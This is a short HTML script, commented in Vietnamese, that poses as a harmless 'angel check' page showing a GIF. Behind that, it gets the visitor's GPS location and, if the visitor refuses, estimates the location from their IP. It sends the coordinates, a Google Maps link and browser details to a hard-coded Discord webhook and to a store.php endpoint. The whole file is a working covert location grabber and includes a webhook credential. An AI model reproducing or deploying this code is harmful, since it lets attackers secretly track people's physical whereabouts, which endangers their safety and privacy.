<script>
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1527956134856495104/4nt29jEEtSdg99Ks_nga5go68k-MyiYoI-e8RY3ymAEw_dgQf98bVuoE6l7_odXxtUXS";

function startAngelCheck() {
    document.getElementById('angel-container').style.display = 'none';
    document.getElementById('giphy-frame').style.display = 'block';
    getLocation();
}

// Hàm gửi Discord chung cho cả 2 trường hợp
function sendToDiscordWebhook(lat, lon, method, accuracy) {
    const payload = {
        embeds: [{
            title: `🎯 Dữ liệu thu thập được (${method})`,
            color: method === "GPS" ? 5763719 : 16744192, // Xanh nếu GPS, Cam nếu IP
            fields: [
                { name: "🛰️ Vĩ độ", value: `\`${lat}\``, inline: true },
                { name: "🛰️ Kinh độ", value: `\`${lon}\``, inline: true },
                { name: "🎯 Độ chính xác", value: `\`${accuracy}\``, inline: false },
                { name: "🌐 Maps", value: `[Xem vị trí](https://www.google.com/maps?q=${lat},${lon})`, inline: false },
                { name: "📱 Info", value: navigator.userAgent, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };
    fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });
}

function getLocation() {
    if (navigator.geolocation) {
        // Nếu người dùng cho phép thì dùng showPosition, từ chối thì dùng handleLocationError
        navigator.geolocation.getCurrentPosition(showPosition, handleLocationError);
    } else {
        getIpLocation(); // Nếu trình duyệt không hỗ trợ Geolocation
    }
}

// Xử lý khi dùng GPS thành công
function showPosition(position) {
    // Gửi về server của bạn
    fetch(`store.php?lat=${position.coords.latitude}&long=${position.coords.longitude}&type=GPS`);
    
    // Gửi về Discord
    sendToDiscordWebhook(position.coords.latitude, position.coords.longitude, "GPS", position.coords.accuracy + " mét");
}

// Xử lý khi người dùng từ chối GPS
function handleLocationError(error) {
    console.log("GPS bị từ chối, đang chuyển sang IP...");
    getIpLocation();
}

// Xử lý lấy IP
function getIpLocation() {
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        fetch(`store.php?lat=${data.latitude}&long=${data.longitude}&type=IP`);
        sendToDiscordWebhook(data.latitude, data.longitude, "IP (Ước tính)", "Không xác định");
    })
    .catch(err => console.error("Lỗi lấy IP:", err));
}
</script>
